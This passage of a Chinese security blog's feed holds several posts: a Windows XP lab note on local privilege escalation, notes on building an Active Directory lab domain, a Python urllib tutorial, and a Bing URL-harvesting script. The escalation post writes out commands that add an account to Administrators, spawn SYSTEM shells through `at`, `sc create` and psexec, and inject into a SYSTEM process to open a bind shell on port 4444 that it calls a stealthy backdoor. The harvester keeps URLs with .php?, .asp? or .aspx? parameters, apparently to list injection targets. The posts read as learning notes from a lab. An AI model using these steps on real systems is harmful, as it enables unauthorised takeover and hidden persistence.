        <content type="html"><![CDATA[<h3 id="0x01-本地提权"><a href="#0x01-本地提权" class="headerlink" title="0x01  本地提权"></a>0x01  本地提权</h3><p>条件：已经实现了本地低权限账号的登陆<br>        1.1 远程溢出<br>        1.2 直接获得账号密码<br>本地提权的目的就是希望获得更高的权限，对目标进一步的进行控制</p><h3 id="0x02-本地提权的基础知识"><a href="#0x02-本地提权的基础知识" class="headerlink" title="0x02 本地提权的基础知识"></a>0x02 本地提权的基础知识</h3><p>系统账户之间权限隔离</p><ol><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间(也划分了很多账号)</li></ol><hr><p>系统账号：</p><ul><li>用户账户登陆时获取权限令牌</li><li>服务账号无需用户登陆已经在后台启动服务(跟随系统启动而启动)</li></ul><hr><p>最高管理员账号:</p><ul><li>windows为==admininstrator==</li><li>linux为==root==<br>最高管理员可以生成很多应用账号，管理员赋给不同的权限，登陆的时候，系统赋予权限的令牌，令牌在登陆的时候绑定在用户会话上，每一次登陆的令牌不是一样的，随机.</li></ul><hr><p>不同系统默认的用户情况：</p><p>windwos:</p><ul><li>user</li><li>Administrator==有一些控制表项不能去修改和删除==</li><li>system 启动运行内核级别的权限(最高)</li></ul><p>administrator和system两个是相互包含的，</p><p>linux</p><ul><li>root=administrator+system</li><li>user</li></ul><hr><h3 id="0x03-windows操作系统的提权"><a href="#0x03-windows操作系统的提权" class="headerlink" title="0x03 windows操作系统的提权"></a>0x03 windows操作系统的提权</h3><ol><li>首先给windwos xp增加一个用户，由于我的xp是在域环境中，所以设置密码需要一个强的密码。<br><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35hzd0nzkj30z20ljdmz.jpg" alt><br>其中<code>net user xingqing *</code>修改用户的密码，<code>net user xingqing password</code>是增加一个用户xingqing.</li></ol><hr><ol start="2"><li><code>net user xingqing</code>查看当前xingqing ,<img src="http://ww1.sinaimg.cn/large/006d1Stply1g35ibb2xyfj30m80e4jta.jpg" alt>,可以看到它是属于当前的users组。Users是Windows中预设的一个用户组，介绍是：防止用户进行有意或无意的系统范围的更改，但是可以运行大部分应用程序。这个用户组包含了所有可登录的用户，默认权限是读取和执行（非系统分区）拒绝访问（所有System Volume Information文件夹及其子文件与子文件夹和其他用户配置文件夹）<br>读取和执行（系统分区下其他文件与文件夹）</li></ol><hr><ol start="3"><li>响应的用户权限以及组说明 <ul><li>Users<br>普通用户组，这个组的用户无法进行有意或无意的改动。因此，用户可以运行经过验证的应用程序，但不可以运行大多数旧版应用程序。Users 组是最安全的组，因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料。Users 组提供了一个最安全的程序运行环境。在经过 NTFS 格式化的卷上，默认安全设置旨在禁止该组的成员危及操作系统和已安装程序的完整性。用户不能修改系统注册表设置、操作系统文件或程序文件。Users 可以创建本地组，但只能修改自己创建的本地组。Users 可以关闭工作站，但不能关闭服务器。</li></ul></li></ol><ul><li>Power Users<br>高级用户组，Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。分配给 Power Users 组的默认权限允许 Power Users 组的成员修改整个计算机的设置。但Power Users 不具有将自己添加到 Administrators 组的权限。在权限设置中，这个组的权限是仅次于Administrators的。</li><li>Administrators<br>管理员组，默认情况下，Administrators中的用户对计算机/域有不受限制的完全访问权。分配给该组的默认权限允许对整个系统进行完全控制。一般来说，应该把系统管理员或者与其有着同样权限的用户设置为该组的成员。</li><li>Guests<br>来宾组，来宾组跟普通组Users的成员有同等访问权，但来宾账户的限制更多。</li><li>Everyone<br>所有的用户，这个计算机上的所有用户都属于这个组。</li><li>SYSTEM组<br>这个组拥有和Administrators一样甚至更高的权限，在察看用户组的时候它不会被显示出来，也不允许任何用户的加入。这个组主要是保证了系统服务的正常运行，赋予系统及系统服务的权限。</li></ul><hr><ol start="4"><li>使用命令将其加入administrators组。</li></ol><p><code>net localgroup Administrators xingqing /add</code>发生1317，用户不存在的系统错误，查资料得是因为你的用户和计算机名一样造成的，我们重新添加一hack的账户，然后继续使用上面的命令成功将hack添加到administrators组。</p><hr><ol start="5"><li>接下来使用命令将hack这个账户，提升为system权限</li></ol><p>我们打开任务管理器，查找用户为system的程序</p><ul><li>使用at命令提升为system</li></ul><p>使用范围： xp,2003使用，win7和win8，win2012,win2008已经删除。</p><p>使用<code>at /?</code>查看需要的命令参数，<code>at time /interactive cmd</code>,interactive是交互式命令行参数。whoami在windows服务器程序会有，默认的xp不存在这个命令。</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35k1nnkklj31bq0n2guv.jpg" alt><br>就会使用system重新启动命令行，它的权限就是system。接下使用cmd打开的所有程序都是system权限。</p><p>接下来输入<code>taskmgr</code>使用system打开任务管理器，然后kill explore进程，最后再重新打开explore进程(文件，新建，explorer.exe),重新加载就是system权限。</p><hr><ul><li>schtasks</li></ul><hr><p><strong>2003测试失败<br>at命令很容易将计划任务安排到第二天去,<br>schtasks虽然强大，但是命令极为复杂</strong></p><hr><ul><li>sc命令</li></ul><p>使用范围：win7和win8，其他未测试</p><p>命令功能: 创建系统服务，SC.exe提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p><p>services.msc运行都是服务。</p><p><code>cmd /k start</code>打开一个新的窗口。</p><p><code>sc Create systemcmd binPath=&quot;cmd /k start&quot; type= own type= interact</code> 创建一个服务名字为systemcmd ,然后服务所属我自己(own)，并且是以交互的方式(可以看见，不会出现在后台)</p><p><code>sc start systemcmd</code>启动这个服务，由于所有的服务是由system启动，所以cmd会成为system权限。</p><p>1060错误未知，待解决</p><ul><li>使用微软工具提system</li></ul><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a>，windows sysinternals解压后将psexec.exe传至xp</p><p>先打开kali ，在路径/usr/share/windows-binaries下将whoami.exe传到xp的windwos/system32文件夹中，</p><p>使用<code>psExec.exe -i -s cmd</code>。目前是失败的</p><hr><ul><li>注入进程提权</li></ul><p>找一个已经是system的服务，然后注入进程得到system权限，使用processinjector工具，放到c目录执行-l显示可以注入的进程。</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35mol3ximj30n90fhn0o.jpg" alt><br>然后记住pid，然后</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35msql6b1j30rh0ik44j.jpg" alt>，注入进程执行cmd程序将shell放在4444端口，等待连接。</p><p>使用kali的nc进行连接：</p><p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35mx14s8fj30sr0hntb8.jpg" alt>,直接就是system权限。<br>然后使用下载的套件sysinternals里面的Procexp.exe查看注入的进程services服务，<br><img src="http://ww1.sinaimg.cn/large/006d1Stply1g35n5xkvj0j31gd0n4ajt.jpg" alt><br>这种后门非常隐蔽。即使注销用户，服务进程依然在，后门依然可以连接。</p><ul><li>WMI</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 内网提权 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网域环境的搭建 (下)</title>
      <link href="/2019/05/12/nei-wang-shen-tou-huan-jing-da-jian-xia/"/>
      <url>/2019/05/12/nei-wang-shen-tou-huan-jing-da-jian-xia/</url>
      
        <content type="html"><![CDATA[<h3 id="0x02-安装域控制器的条件"><a href="#0x02-安装域控制器的条件" class="headerlink" title="0x02 安装域控制器的条件"></a>0x02 安装域控制器的条件</h3><ol><li>安装者必须具有本地管理员权限</li><li>操作系统版本必须满足条件（Windows Server 2008 除Web版外都满足）</li><li>本地磁盘至少有一个分区是NTFS文件系统</li><li>有TCP/IP设置（IP地址、子网掩码等）</li><li>有相应的DNS服务器支持</li><li>有足够的可用空间</li></ol><h3 id="0x03-域环境实战安装"><a href="#0x03-域环境实战安装" class="headerlink" title="0x03 域环境实战安装"></a>0x03 域环境实战安装</h3><ol><li>安装软件:vmware，windows2003,windows7,windows8.<br>关于vmware的三个网络连接模式简单介绍</li><li><a href="https://www.cnblogs.com/linjiaxin/p/6476480.html" target="_blank" rel="noopener">vmware三个网络模式详解</a></li></ol><h3 id="0x04-安装域控制器"><a href="#0x04-安装域控制器" class="headerlink" title="0x04 安装域控制器"></a>0x04 安装域控制器</h3><ol><li>设置windows2003为Nat，然后设置其为静态ip.</li></ol><p><img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ytjctcklj31bk0pdjuh.jpg" alt></p><ol start="2"><li>更改计算机名，win8和win10同样设置。</li></ol><p>注解：中途遇到很多坑，win8切记是企业版，win10一样。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网域环境搭建(上)</title>
      <link href="/2019/05/12/nei-wang-yu-huan-jing-da-jian-shang/"/>
      <url>/2019/05/12/nei-wang-yu-huan-jing-da-jian-shang/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-域环境背景知识"><a href="#0x01-域环境背景知识" class="headerlink" title="0x01 域环境背景知识"></a>0x01 域环境背景知识</h3><h4 id="1-域"><a href="#1-域" class="headerlink" title="1. 域"></a>1. 域</h4><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域。域是组织与存储资源的核心管理单元。在域中，至少存在一个域控制器，它保存着整个域中的用户账号和安全数据。</p><p><img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ys2ok26oj307n06lgmp.jpg" alt="域环境 "></p><hr><h4 id="2-域控制器"><a href="#2-域控制器" class="headerlink" title="2. 域控制器"></a>2. 域控制器</h4><ol><li>在域中，至少有一台DC，一般情况下一个域会有多台DC</li><li>域控制器中保存着整个域的用户帐号和安全数据库</li><li>安装有Active Directory的主机</li></ol><hr><h4 id="3-活动目录"><a href="#3-活动目录" class="headerlink" title="3. 活动目录"></a>3. 活动目录</h4><p>活动目录是Windows网络中的目录服务，提供了存储网络对象信息并使网络用户使用这些数据的方法!它的特点如下：</p><ol><li>集中管理 </li><li>便捷的网络资源访问，用户登陆一次就能访问整个网络资源，网络资源主要包含大量的对象（用户账户、组、共享文件夹、打印机等）</li></ol><h4 id="4-域的特性"><a href="#4-域的特性" class="headerlink" title="4. 域的特性"></a>4. 域的特性</h4><p>域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的，如下图：<img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ysahbetgj30f109bdgh.jpg" alt></p><p>默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中，如下图：<br><img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ysibyspgj30hj0glt9b.jpg" alt></p><h4 id="5-域树和林的概念"><a href="#5-域树和林的概念" class="headerlink" title="5. 域树和林的概念"></a>5. 域树和林的概念</h4><ol><li>具有连续的域名空间的多个域</li><li>林由一个或者多个域树组成。<br><img src="http://ww1.sinaimg.cn/large/006WGZFYly1g2ysm3x5nsj30cu07mdhi.jpg" alt></li></ol><h4 id="6-组织单位"><a href="#6-组织单位" class="headerlink" title="6. 组织单位"></a>6. 组织单位</h4><p>OU（Organizational Units，组织单位），组织单位是活动目录中最小的管理单元，OU可以建立子对象，利用OU可以建立管理模型。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 爬虫基本库的使用</title>
      <link href="/2019/04/13/python-pa-chong-ji-ben-ku-de-shi-yong/"/>
      <url>/2019/04/13/python-pa-chong-ji-ben-ku-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="1-urllib库"><a href="#1-urllib库" class="headerlink" title="1.urllib库"></a>1.urllib库</h2><p><code>python3</code>中将<code>python2</code>中的<code>urllib</code>和<code>urllib2</code>两个库统一起来，统一为<code>urllib</code>库，它分为四个模块。</p><p><code>request</code>:发送<code>HTTP</code>请求的模块。</p><p><code>error</code>:异常处理模块，如果出现请求异常，可以获得异常并且进行处理</p><p><code>parse</code>: 提供对<code>URL</code>处理方法，拆分、解析、合并等。</p><p><code>robotparser</code>:用来识别网站的<code>robots.txt</code>文件，然后判断哪些网站可以爬，那些不可爬。</p><h2 id="2-request发送请求模块"><a href="#2-request发送请求模块" class="headerlink" title="2. request发送请求模块"></a>2. request发送请求模块</h2><p><code>request</code>模块可以模拟浏览器发出<code>HTTP</code>请求，同时带有处理授权验证、重定向、<code>cookies</code>以及其他内容。</p><h3 id="2-1-urlopen"><a href="#2-1-urlopen" class="headerlink" title="2.1 urlopen()"></a>2.1 urlopen()</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestresponse<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>getheaders<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>getheader<span class="token punctuation">(</span><span class="token string">'Server'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>通过上面代码可以对网站进行<code>http</code>请求，将获得的相应存储在<code>response</code>里面，<code>response</code>是一个<code>HTTPResponse</code>对象，主要包含<code>read()</code>、<code>readinto()</code>、<code>getheader(name)</code>、<code>getheaders()</code>、<code>fileno()</code>等方法，以及<code>msg</code>、<code>version</code>、<code>status</code>等属性，<code>type(response)</code>将显示出<code>response</code>的属性，</p><pre><code>&lt;class &#39;http.client.HTTPResponse&#39;&gt;</code></pre><p><strong>注意：response.getheaders() 返回头部所有的信息，然后resopnse.gethead(‘name’)是返回指定的头部名称信息，它没有S。</strong></p><p>函数的格式：</p><pre><code>urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)</code></pre><p>参数说明：</p><p><code>data</code>是<code>post</code>传值的数据，可以传递表单</p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'qin'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>urllib.parse.urlencode</code>是将字典转换成字符串，最后变成</p><pre class=" language-python"><code class="language-python">name<span class="token operator">=</span>qin<span class="token punctuation">,</span>data <span class="token operator">=</span> bytes<span class="token punctuation">(</span>urllib <span class="token punctuation">.</span> parse <span class="token punctuation">.</span> urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'word ’:’ hello'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding ＝’ ut <span class="token number">8</span>'<span class="token punctuation">)</span></code></pre><p><code>timeout</code>参数:</p><p>用来设置超时时间，单位是秒，支持<code>ftp</code>,<code>http</code>,<code>https</code>请求</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>error<span class="token keyword">try</span><span class="token punctuation">:</span>    response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'****'</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'TIME OUT'</span><span class="token punctuation">)</span></code></pre><p>其他参数:</p><p><code>context</code>是指定<code>ssl</code>设置的，<code>cafile</code>和<code>capath</code>是指定证书和路径的。</p><h3 id="2-2-使用Request对象来发出请求"><a href="#2-2-使用Request对象来发出请求" class="headerlink" title="2.2. 使用Request对象来发出请求"></a>2.2. 使用Request对象来发出请求</h3><p>因为<code>urlopen()</code>可以实现最基本的请求，但是不足用来构建一个完整的请求。如果加入<code>Headers</code>等信息，需要利用更加强大的<code>Request</code>类</p><p><code>Request</code>对象：</p><pre><code>class urllib.request.Request(ur1,data=None,headers={},origin_req_host=None,unverifiable=False,method=None) </code></pre><p><code>url</code>是必传参数，<code>data</code>可选，必须是字节流使用<code>bytes</code>类型，字典的话得用<code>urllib.parse</code>模块的<code>urlencode()</code>编码，第三个参数<code>headers</code>是字典，是请求头，<code>origin_req_host</code>是请求方的<code>ip</code>或者<code>host</code>名称，第六个是<code>method</code>,<code>get</code>、<code>post</code>等</p><p>实例：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> request<span class="token punctuation">,</span>parseurl<span class="token operator">=</span><span class="token string">'http://httpbin.org/post'</span>headers<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/4.0(compatible;MSIE 5-5;Windows NT'</span><span class="token punctuation">,</span>    <span class="token string">'Host'</span><span class="token punctuation">:</span><span class="token string">'httpbin.org'</span><span class="token punctuation">}</span>dict<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'qinjian'</span><span class="token punctuation">}</span>data<span class="token operator">=</span>bytes<span class="token punctuation">(</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>dict<span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>req<span class="token operator">=</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span>response<span class="token operator">=</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>headers也可以使用add_header<span class="token punctuation">(</span><span class="token punctuation">)</span>方法来添加：req<span class="token operator">=</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span><span class="token string">'Mozilla/4.0(compatible;MSIE 5-5;Windows NT'</span><span class="token punctuation">)</span></code></pre><h3 id="2-3-高级用法"><a href="#2-3-高级用法" class="headerlink" title="2.3 高级用法"></a>2.3 高级用法</h3><p><code>handle</code>用来处理登陆验证的，可以代理设置也可以处理<code>cookie</code>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bing批量采集URL去重复链接脚本</title>
      <link href="/2019/04/12/bing-pi-liang-cai-ji-url-qu-chong-fu-lian-jie-jiao-ben/"/>
      <url>/2019/04/12/bing-pi-liang-cai-ji-url-qu-chong-fu-lian-jie-jiao-ben/</url>
      
        <content type="html"><![CDATA[<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- conding:utf-8 -*-</span><span class="token keyword">import</span> re<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">import</span> urllib<span class="token keyword">import</span> argparse<span class="token keyword">import</span> timelogo <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  _______    ___     ___    _       |__   __|  / _ \   / _ \  | |         | |    | | | | | | | | | |  ___    | |    | | | | | | | | | | / __|    | |    | |_| | | |_| | | | \__ \\    |_|     \___/   \___/  |_| |___/'''</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>logo<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Obtain_url</span><span class="token punctuation">(</span>page_number<span class="token punctuation">,</span>your_url<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#爬抓bing获取url</span>    browser <span class="token operator">=</span> ChromeDriverNOBrowser<span class="token punctuation">(</span><span class="token punctuation">)</span>    browser<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    page <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&amp;first='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>page_number<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    crux <span class="token operator">=</span>your_url    crux <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>crux<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#解决编码报错问题</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'url.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        count_page<span class="token operator">=</span><span class="token number">1</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> page<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在爬取第'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>count_page<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'页:'</span><span class="token punctuation">)</span>            count_page<span class="token operator">=</span>count_page<span class="token operator">+</span><span class="token number">1</span>            current_url<span class="token operator">=</span><span class="token string">'https://cn.bing.com/search?q='</span><span class="token operator">+</span>crux<span class="token operator">+</span>i            <span class="token keyword">print</span><span class="token punctuation">(</span>current_url<span class="token punctuation">)</span>            browser <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>current_url<span class="token punctuation">)</span>            content<span class="token operator">=</span>browser<span class="token punctuation">.</span>page_source            res <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;h2>&lt;a target="_blank" href="(.*?)"'</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> res<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>content<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> data<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ChromeDriverNOBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chrome_options <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>    chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--headless'</span><span class="token punctuation">)</span>    chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--disable-gpu'</span><span class="token punctuation">)</span>    driverChrome <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>chrome_options<span class="token operator">=</span>chrome_options<span class="token punctuation">)</span>    <span class="token keyword">return</span> driverChrome<span class="token keyword">def</span> <span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#处理bing爬抓下来的链接</span>    url <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'链接处理'</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#读取文件内容到列表里</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            url<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    data <span class="token operator">=</span> list<span class="token punctuation">(</span>set<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#去重url列表</span>    data <span class="token operator">=</span> sorted<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#排列顺序</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'new_url.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#判断url是否有.php? .asp? .aspx?</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>            res <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\.php\?'</span><span class="token punctuation">)</span>            datas <span class="token operator">=</span> res<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">if</span> datas <span class="token operator">!=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\.asp\?'</span><span class="token punctuation">)</span>                datas <span class="token operator">=</span> res<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">if</span> datas <span class="token operator">!=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    res <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\.aspx\?'</span><span class="token punctuation">)</span>                    datas <span class="token operator">=</span> res<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                    <span class="token keyword">if</span> datas <span class="token operator">!=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">)</span>year <span class="token operator">=</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tm_yearmon <span class="token operator">=</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tm_monday <span class="token operator">=</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tm_mdayhour <span class="token operator">=</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tm_hourmin <span class="token operator">=</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tm_minsec <span class="token operator">=</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tm_secnowtime <span class="token operator">=</span> str<span class="token punctuation">(</span>year<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token 